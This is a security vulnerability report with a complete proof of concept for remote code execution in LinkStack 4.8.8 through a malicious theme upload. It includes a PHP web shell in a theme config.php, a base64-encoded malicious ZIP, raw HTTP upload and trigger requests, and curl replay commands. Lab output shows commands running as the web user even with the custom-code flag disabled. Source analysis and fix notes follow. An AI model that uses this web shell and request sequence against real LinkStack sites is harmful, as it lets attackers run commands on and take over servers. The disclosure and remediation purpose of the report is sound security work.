### Vulnerability details

**Official website / Product:** https://linkstack.org / https://github.com/LinkStackOrg/LinkStack

**Repository:** LinkStackOrg/LinkStack (stars at selection: 3934)

**Vulnerability type:** file_upload → getshell (RCE via malicious theme `config.php` include)

**Vulnerability versions:** 4.8.8 (Docker image `linkstackorg/linkstack:latest`, `version.json` 4.8.8; source commit `35d8205f017014f457f517d3a3285bdc82f151d5` / tag v4.8.8). Sink unchanged on audited main.

**Vulnerability URL / Parameter:** `POST /studio/theme` multipart field `zip` (admin theme upload) → public `GET /@{littlelink}?r9a3=` triggers `include` of `themes/{theme}/config.php`

**Complex:** yes

### Verification procedure

1. Bring up LinkStack 4.8.8 on host port **18903** → container 80:
   ```bash
   docker run -d --name linkstack-r9a3 -p 18903:80 linkstackorg/linkstack:latest
   ```
   Equivalent compose:
   ```yaml
   services:
     linkstack:
       image: linkstackorg/linkstack:latest
       container_name: linkstack-r9a3
       ports:
         - "18903:80"
   ```
2. Finish install via `GET http://127.0.0.1:18903/skip` (AdminSeeder) → login `admin@admin.com` / `12345678` (littlelink username `admin`).
3. Set `ALLOW_CUSTOM_CODE_IN_THEMES=false` in the container `/htdocs/.env` (security control that is supposed to block untrusted theme code; this vuln still works when false):
   ```bash
   docker exec linkstack-r9a3 sed -i 's/^ALLOW_CUSTOM_CODE_IN_THEMES=.*/ALLOW_CUSTOM_CODE_IN_THEMES=false/' /htdocs/.env
   ```
4. Build a malicious theme ZIP (members must be `eviltheme/config.php` and optional `eviltheme/readme.md`):
   ```bash
   mkdir -p eviltheme
   cat > eviltheme/config.php <<'PHP'
   <?php
   if (isset($_GET["r9a3"])) {
     header("Content-Type: text/plain");
     echo "R9A3-THEME-CONFIG-RCE\n";
     system($_GET["r9a3"]);
     exit;
   }
   return [
       'allow_custom_buttons' => 'false',
       'open_links_in_same_tab' => 'false',
       'enable_custom_code' => 'false',
       'enable_custom_head' => 'false',
       'enable_custom_body' => 'false',
       'enable_custom_body_end' => 'false',
       'use_custom_icons' => 'false',
       'custom_icon_extension' => '.svg',
   ];
   PHP
   cat > eviltheme/readme.md <<'MD'
   # A LinkStack Theme
   *	Theme Name: eviltheme
   *	Theme Version: 1.0
   *	Theme Author: audit
   *	Theme License: MIT
   MD
   zip -r evil-config-theme.zip eviltheme
   ```
   Or restore the lab-captured ZIP (569 bytes; members `eviltheme/config.php` + `eviltheme/readme.md`) from base64:
   ```bash
   echo 'UEsDBBQAAAAIAJA9YV02Y2577QAAAMsBAAAUAAAAZXZpbHRoZW1lL2NvbmZpZy5waHCN0E1Lw0AQBuD7/oplEZKA0UNPNX4gIVYPKpTcalk2ydQsbmZDZqIN4n83tSgigXqdeeYdZs6v2roVdiNDSwQcHulFlq9UNzcztY4i+S6krMFU0IUq9ciAHOdDC2eSYcunrTMWVZSMCsraS7WcX8/i/Da7z+L08eHmbhEv0+wJ1U7QQAzNnxVfo1vLifgQHXDfoVyNJSkD45x/02VP7Btd9MweKZAXlzLYGEcQHO+ZbwG1s/hC2qIm04BmU0xAQFM4+A4sfQUH0e7yg6jw1fAvpAGn0nr6UbacvvFXW49vByTrce9O6PV5ZOtEfAJQSwMEFAAAAAgAkD1hXehSSZpQAAAAbAAAABMAAABldmlsdGhlbWUvcmVhZG1lLm1kU1ZwVPDJzMsOLklMzlYIyUjNTeXS4gTTCn6JualWCqllmTklKOJhqUXFmfl5VgqGegZwQcfSkoz8IiuFxNKUzBK4qE9mcmpeMdAUX88QLgBQSwECFAMUAAAACACQPWFdNmNue+0AAADLAQAAFAAAAAAAAAAAAAAAgAEAAAAAZXZpbHRoZW1lL2NvbmZpZy5waHBQSwECFAMUAAAACACQPWFd6FJJmlAAAABsAAAAEwAAAAAAAAAAAAAAgAEfAQAAZXZpbHRoZW1lL3JlYWRtZS5tZFBLBQYAAAAAAgACAIMAAACgAQAAAAA=' | base64 -d > evil-config-theme.zip
   ```
5. Log in as admin, open `GET /studio/theme`, and take CSRF `_token` plus `linkstack_session` / `XSRF-TOKEN` from the page/cookies.
6. As admin, `POST /studio/theme` with multipart fields `zip`, `theme=eviltheme`, and `_token`. Full raw upload packet is in the PoC below; or use the step-4 `evil-config-theme.zip` with curl.
7. Observe `302` to `/studio/theme` and directory `themes/eviltheme/` on disk (`docker exec linkstack-r9a3 ls /htdocs/themes/eviltheme`).
8. Unauthenticated (or any visitor) request `GET /@admin?r9a3=id` — `theme()` PHP-`include`s the planted `config.php` and executes the payload.
9. Optionally: low-priv user sets `theme=eviltheme` via the same endpoint (zip ignored for non-admin) and triggers `GET /@bobr9?r9a3=id` for the same getshell.

### Complete vulnerability PoC

**A. Admin theme ZIP upload (plants malicious `config.php`)**

Complete HTTP request (Docker-verified; ZIP is binary — marked below; build `evil-config-theme.zip` via step 4 `zip -r` or base64; replace Cookie / `_token` with a fresh admin session):

```http
POST /studio/theme HTTP/1.1
Host: 127.0.0.1:18903
User-Agent: r9a3-poc
Accept: text/html,application/xhtml+xml
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr9a3LinkStack
Content-Length: 990
Cookie: XSRF-TOKEN=<admin-xsrf>; linkstack_session=<admin-session>
Origin: http://127.0.0.1:18903
Referer: http://127.0.0.1:18903/studio/theme
Connection: close

------WebKitFormBoundaryr9a3LinkStack
Content-Disposition: form-data; name="_token"

<csrf-token-from-/studio/theme>
------WebKitFormBoundaryr9a3LinkStack
Content-Disposition: form-data; name="theme"

eviltheme
------WebKitFormBoundaryr9a3LinkStack
Content-Disposition: form-data; name="zip"; filename="evil-config-theme.zip"
Content-Type: application/zip

<binary: evil-config-theme.zip — members eviltheme/config.php + eviltheme/readme.md; 569 bytes; build via step 4 zip -r or base64>
------WebKitFormBoundaryr9a3LinkStack--
```

Equivalent curl (preferred for replay):

```bash
# After login, with Cookie and _token:
curl -sk -D- 'http://127.0.0.1:18903/studio/theme' \
  -H "Cookie: XSRF-TOKEN=...; linkstack_session=..." \
  -F "_token=<csrf>" \
  -F "theme=eviltheme" \
  -F "zip=@evil-config-theme.zip;type=application/zip"
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 302 Found
Date: Sun, 01 Nov 2026 12:46:05 GMT
Server: Apache/2.4.69 (Unix)
X-Powered-By: PHP/8.3.36
Cache-Control: no-cache, private
Location: http://127.0.0.1:18903/studio/theme
Set-Cookie: XSRF-TOKEN=eyJpdiI6InJYRmtxR1dGd0VvTVJEUEFnQ2Q5cHc9PSIsInZhbHVlIjoienB0S1Y5dDFtRXJXa3pSVDhaa0c0WC9IbVJ5bXJJUFV1VXVWZHFuRTBMQXFYdlVHcVdYNEZsellFL0RiUVNMc3VnSmpkVm5kNEgwdmZmbWp3SmN6QW9Cb0VqOThFbFNpN3RQMmc1SndzMHR6VlpwZ1ZINGZLVmQ1c2sxd3k4VGsiLCJtYWMiOiJkMjNhYTdmYzk1YWFkNzMxYmFiNjRhNDEyZTg5OTVhNDBmYmY0OTFiMTMxOWE4OTA3ZmZmNjU1NzAwNjlmODgyIiwidGFnIjoiIn0%3D; expires=Sun, 01-Nov-2026 14:46:05 GMT; Max-Age=7200; path=/; samesite=lax
Set-Cookie: linkstack_session=eyJpdiI6ImZnTEpjR3Y2ZFNJYk4rQ04zZXhEcEE9PSIsInZhbHVlIjoiMSs1RHNvQlMwRVpjYk9FbS82Q1ZXOURzVzl0NllnZGRGVGJnT2E5bnFhVUIxZzUzMXE3Uk9GVzl3TUxvSzVKcTAydlI1UEFVZGs0a2YyOC94ZkJMaWFsVjZmcUdVNWc0YjFVS05WODc4VGNKT1c3ODVlL2N6Nm51cGxmRTFnejkiLCJtYWMiOiIyYWY5NzBhNDdmMzAxYmQ2MzI5MmJmMWFmMWQ0N2VmYWIwODY1ZGFmNzM2NjM3MzcwOTBhNDNkNmI5YzFiZjg4IiwidGFnIjoiIn0%3D; expires=Sun, 01-Nov-2026 14:46:05 GMT; Max-Age=7200; path=/; httponly; samesite=lax
Connection: close
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="refresh" content="0;url='http://127.0.0.1:18903/studio/theme'" />

        <title>Redirecting to http://127.0.0.1:18903/studio/theme</title>
    </head>
    <body>
        Redirecting to <a href="http://127.0.0.1:18903/studio/theme">http://127.0.0.1:18903/studio/theme</a>.
    </body>
</html>
```

**B. Unauthenticated RCE trigger (public profile includes `config.php`)**

Complete HTTP request (Docker-verified):

```http
GET /@admin?r9a3=id HTTP/1.1
Host: 127.0.0.1:18903
User-Agent: r9a3-poc
Accept: */*
Connection: close
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
Date: Sun, 01 Nov 2026 12:46:05 GMT
Server: Apache/2.4.69 (Unix)
X-Powered-By: PHP/8.3.36
Vary: Accept-Encoding
Content-Length: 106
Connection: close
Content-Type: text/plain;charset=UTF-8

    
                        
  
R9A3-THEME-CONFIG-RCE
uid=100(apache) gid=101(apache) groups=101(apache)
```

Verification result notes:

Upload returns `302` and `themes/eviltheme/config.php` appears in the container. Then unauthenticated `GET /@admin?r9a3=id` returns HTTP 200 text/plain containing `R9A3-THEME-CONFIG-RCE` and `uid=100(apache) gid=101(apache) groups=101(apache)` as user `apache`. Lab capture excerpt:

```text
$ curl -sv "http://127.0.0.1:18903/@admin?r9a3=id" 2>&1
HTTP/1.1 200 OK
Content-Type: text/plain;charset=UTF-8
Content-Length: 106

R9A3-THEME-CONFIG-RCE
uid=100(apache) gid=101(apache) groups=101(apache)

$ curl -sv "http://127.0.0.1:18903/@bobr9?r9a3=id" 2>&1 | tail -5
R9A3-THEME-CONFIG-RCE
uid=100(apache) gid=101(apache) groups=101(apache)

$ docker exec linkstack-r9a3 grep ALLOW_CUSTOM /htdocs/.env
ALLOW_CUSTOM_CODE_IN_THEMES=false
ALLOW_CUSTOM_BACKGROUNDS=true

$ docker exec linkstack-r9a3 head -20 /htdocs/themes/eviltheme/config.php
<?php
if (isset($_GET["r9a3"])) {
  header("Content-Type: text/plain");
  echo "R9A3-THEME-CONFIG-RCE\n";
  system($_GET["r9a3"]);
  exit;
}
return [
    'allow_custom_buttons' => 'false',
    ...
];
```

The same getshell works with `ALLOW_CUSTOM_CODE_IN_THEMES=false`. Low-priv theme switch likewise: `GET /@bobr9?r9a3=id` returns the same RCE marker.

### Vulnerability analysis

`UserController::editTheme` allows an **admin** to upload a theme ZIP validated only as `mimes:zip`. The archive is moved to `themes/temp.zip` and extracted with `ZipArchive::extractTo($themesPath)` with **no** content allowlist, no ban on PHP, and no review of `config.php`. The user's `theme` column is updated to the submitted name in the same request.

On every public profile render, `resources/views/linkstack/modules/theme.blade.php` defines `theme($key)` which does:

`include base_path('themes/' . $themeName . '/config.php')`

That `include` is **unconditional**. The env flag `ALLOW_CUSTOM_CODE_IN_THEMES` only gates Blade `@include` of `extra/custom-head|body|body-end` — it does **not** wrap the `config.php` include. Therefore a theme marketed as “CSS-only” can still ship a malicious `config.php` and achieve OS command execution as the web user when any page using that theme is viewed.

Any authenticated user may set `theme` to an already-installed malicious theme name (no server-side allowlist against `scandir(themes)`), so after one admin install (or a poisoned marketplace ZIP), a low-priv user can activate getshell on their public URL.

Classic Zip Slip (`../` entries) against `extractTo` is mitigated on the lab’s PHP **8.3.36**; this finding does not rely on path escape — the malicious PHP is installed **inside** `themes/` as a normal theme package.

Trigger / sink source (full path and line numbers):

```php
# File: app/Http/Controllers/UserController.php
# Lines: 747-809
    public function editTheme(request $request)
    {
        $request->validate([
            'zip' => 'sometimes|mimes:zip',
        ]);

        $userId = Auth::user()->id;

        $zipfile = $request->file('zip');

        $theme = $request->theme;
        $message = "";

        User::where('id', $userId)->update(['theme' => $theme]);



        if (!empty($zipfile) && Auth::user()->role == 'admin') {

            $themesPath = base_path('themes');
            $tmpPath = base_path() . '/themes/temp.zip';
            $zipfile->move($themesPath, "temp.zip");

            $zip = new ZipArchive;
            $zip->open($tmpPath);
            $zip->extractTo($themesPath);
            $zip->close();
            unlink($tmpPath);

            // Removes version numbers from folder.

            $regex = '/[0-9.-]/';
            $files = scandir($themesPath);
            $files = array_diff($files, array('.', '..'));

            foreach ($files as $file) {

                $basename = basename($file);
                $filePath = $themesPath . '/' . $basename;

                if (!is_dir($filePath)) {
                        
                    try {
                        File::delete($filePath);
                    } catch (exception $e) {}

                }

                if (preg_match($regex, $basename)) {

                    $newBasename = preg_replace($regex, '', $basename);
                    $newPath = $themesPath . '/' . $newBasename;
                    File::copyDirectory($filePath, $newPath);
                    File::deleteDirectory($filePath);

                }

            }

        }


        return Redirect('/studio/theme')->with("success", $message);
```

```php
# File: resources/views/linkstack/modules/theme.blade.php
# Lines: 1-15 (unconditional config.php include)
@php
// Theme Config
if (!function_exists('theme')) {
  function theme($key){
$key = trim($key);
$file = base_path('themes/' . $GLOBALS['themeName'] . '/config.php');
  if (file_exists($file)) {
    $config = include $file;
  if (isset($config[$key])) {
    return $config[$key];
}}
return null;}
}

// Theme Custom Asset
```

```php
# File: resources/views/linkstack/modules/theme.blade.php
# Line: 49 (ALLOW_CUSTOM_CODE only gates Blade extras — not config.php)
@if(theme('enable_custom_code') == "true" and theme('enable_custom_head') == "true" and env('ALLOW_CUSTOM_CODE_IN_THEMES') == 'true')@include($GLOBALS['themeName'] . '.extra.custom-head')@endif
```

### Fix notes

1. Do not `include` theme `config.php` as free-form PHP. Load theme settings from JSON/YAML (or a sandboxed PHP that cannot call dangerous functions), or restrict `config.php` to a returned array via a tokenizer/AST allowlist.
2. Honor `ALLOW_CUSTOM_CODE_IN_THEMES=false` by refusing to execute any theme PHP (including `config.php`) and by rejecting ZIP members with `.php` / `.blade.php` when the flag is false.
3. Validate theme package layout (required files, no unexpected PHP) before extract; extract to a temp dir, verify, then move.
4. Allowlist `theme` values against installed theme directory names (reject path segments / unknown names).
